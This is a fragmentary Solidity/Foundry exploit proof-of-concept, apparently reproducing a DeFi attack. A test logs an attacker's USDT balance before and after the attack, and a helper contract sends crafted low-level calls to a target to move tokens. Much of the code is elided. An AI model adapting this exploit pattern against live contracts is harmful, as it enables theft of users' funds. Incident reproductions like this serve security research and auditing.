...
contract ContractTest is Test {
    ...
    function testPoC() public {
        emit log_named_decimal_uint(
            "before attack: balance of attacker",
            IERC20(0x55d398326f99059fF775485246999027B3197955).balanceOf(attacker),
            18
        );
        ...
        vm.stopPrank();
        emit log_named_decimal_uint(
            "after attack: balance of attacker",
            IERC20(0x55d398326f99059fF775485246999027B3197955).balanceOf(attacker),
            18
        );
    }
...
contract AddrCC {
    ...
    function process(address tokenIn, address tokenOut) external {
        (bool ok1, bytes memory ret1) =
            tokenIn.staticcall(abi.encodeWithSelector(IERC20(tokenIn).balanceOf.selector, addr));
        ...
        bytes memory data = abi.encodeWithSelector(
            ...
            address(this),
            uint256(3),
            bytes32(hex"4149520000000000000000000000000000000000000000")
        );
        (bool ok2,) = addr.call(data);
        require(ok2, "addr call failed");

        (bool ok3, bytes memory ret3) =
            tokenIn.staticcall(abi.encodeWithSelector(IERC20(tokenIn).balanceOf.selector, address(this)));
